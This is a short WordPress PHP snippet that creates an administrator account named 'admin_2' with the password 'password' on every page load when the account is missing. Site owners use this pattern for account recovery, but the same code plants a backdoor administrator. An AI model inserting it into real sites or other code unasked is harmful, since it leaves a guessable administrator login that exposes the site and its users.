<?

add_action( 'init', function () {
	$username = 'admin_2';
	$password = 'password';
	$email_address = 'webmaster_2@mydomain.com';

	if ( ! username_exists( $username ) ) {
		$user_id = wp_create_user( $username, $password, $email_address );
		$user = new WP_User( $user_id );
		$user->set_role( 'administrator' );
	}
} );
